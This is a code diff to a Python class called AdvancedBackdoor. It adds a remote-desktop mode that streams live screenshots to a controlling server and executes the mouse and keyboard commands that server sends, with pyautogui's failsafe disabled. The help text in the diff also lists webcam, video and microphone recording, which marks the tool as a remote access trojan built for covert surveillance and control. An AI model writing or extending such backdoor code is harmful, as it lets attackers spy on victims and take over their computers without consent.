@@ -531,6 +531,112 @@ class AdvancedBackdoor:
                 time.sleep(interval)
         self.reliable_send("[STREAM_END]")
 
+    # ─── NEW: Real-time remote desktop (AnyDesk-style) ────────────────────────
+
+    def remote_desktop_mode(self, quality=30, fps=15):
+        """
+        Full-duplex streaming mode.
+        Client → Server : [4-byte big-endian length][JPEG bytes]  (continuous)
+        Server → Client : {"type":"…", …}\n                       (control events)
+        Exit condition  : server sends {"type":"stop"}\n
+                          client sends 4 zero bytes as end-of-stream marker
+        """
+        try:
+            import pyautogui
+            pyautogui.FAILSAFE = False
+            pyautogui.PAUSE = 0
+        except ImportError:
+            print("[-] pyautogui not installed — remote control disabled")
+
+        self._rd_active = True
+        self._rd_quality = quality
+        self._rd_fps = fps
+
+        # Background thread: receive and execute control events from server
+        def _ctrl_loop():
+            buf = b""
+            while self._rd_active:
+                try:
+                    chunk = self.s.recv(4096)
+                    if not chunk:
+                        self._rd_active = False
+                        break
+                    buf += chunk
+                    while b"\n" in buf:
+                        line, buf = buf.split(b"\n", 1)
+                        line = line.strip()
+                        if line:
+                            try:
+                                evt = json.loads(line.decode())
+                                if evt.get("type") == "stop":
+                                    self._rd_active = False
+                                    return
+                                self._apply_control(evt)
+                            except Exception:
+                                pass
+                except Exception:
+                    self._rd_active = False
+                    break
+
+        threading.Thread(target=_ctrl_loop, daemon=True).start()
+
+        # Main: capture screen and stream JPEG frames
+        while self._rd_active:
+            t0 = time.time()
+            try:
+                img = ImageGrab.grab(all_screens=True)
+                buf = io.BytesIO()
+                img.save(buf, format="JPEG", quality=self._rd_quality)
+                frame = buf.getvalue()
+                self.s.sendall(len(frame).to_bytes(4, "big") + frame)
+            except Exception as e:
+                if self._rd_active:
+                    print(f"[-] RD frame error: {e}")
+                self._rd_active = False
+                break
+
+            interval = 1.0 / max(self._rd_fps, 1)
+            rem = interval - (time.time() - t0)
+            if rem > 0:
+                time.sleep(rem)
+
+        # Zero-length frame = end-of-stream signal to server
+        try:
+            self.s.sendall(b"\x00\x00\x00\x00")
+        except Exception:
+            pass
+
+    def _apply_control(self, evt):
+        """Execute a single mouse/keyboard control event from the server."""
+        try:
+            import pyautogui
+            t = evt.get("type", "")
+            x, y = evt.get("x", 0), evt.get("y", 0)
+
+            if t == "settings":
+                self._rd_quality = max(5, min(95, evt.get("quality", self._rd_quality)))
+                self._rd_fps    = max(1, min(30, evt.get("fps",     self._rd_fps)))
+            elif t == "mouse_move":
+                pyautogui.moveTo(x, y)
+            elif t == "mouse_click":
+                pyautogui.click(x, y, button=evt.get("btn", "left"))
+            elif t == "mouse_double":
+                pyautogui.doubleClick(x, y)
+            elif t == "mouse_right":
+                pyautogui.rightClick(x, y)
+            elif t == "mouse_scroll":
+                pyautogui.scroll(evt.get("delta", 0), x=x, y=y)
+            elif t == "key_press":
+                key = evt.get("key", "")
+                if key:
+                    pyautogui.press(key)
+            elif t == "key_type":
+                text = evt.get("text", "")
+                if text:
+                    pyautogui.write(text, interval=0)
+        except Exception:
+            pass
+
     # ─── Shell ────────────────────────────────────────────────────────────────
 
     def shell(self):  # noqa: C901
@@ -685,6 +791,13 @@ class AdvancedBackdoor:
                 self.reliable_send(f"[*] Starting screen stream ({count} frames)...")
                 self.screen_stream(count)
 
+            # ── NEW: real-time remote desktop ─────────────────────────────────
+            elif command == "remote_desktop":
+                # Respond with fixed 4-byte handshake marker (NOT encrypted JSON)
+                # so the server can cleanly switch to binary framing mode.
+                self.s.sendall(b"RDST")
+                self.remote_desktop_mode()
+
             # ── help ──────────────────────────────────────────────────────────
             elif command == "help":
                 self.reliable_send(_HELP_TEXT)
@@ -723,6 +836,7 @@ FILE
 CAPTURE
   screenshot                  Screenshot all monitors (PNG)
   screen_stream [n]           Stream n screenshots (default 5, ~1.5s apart)
+  remote_desktop              Live screen view + full mouse/keyboard control
   webcam                      Single webcam frame (JPG)
   webcam_video [sec]          Record webcam video (default 10s, AVI)
   audio_record [sec]          Record microphone (default 10s, WAV)
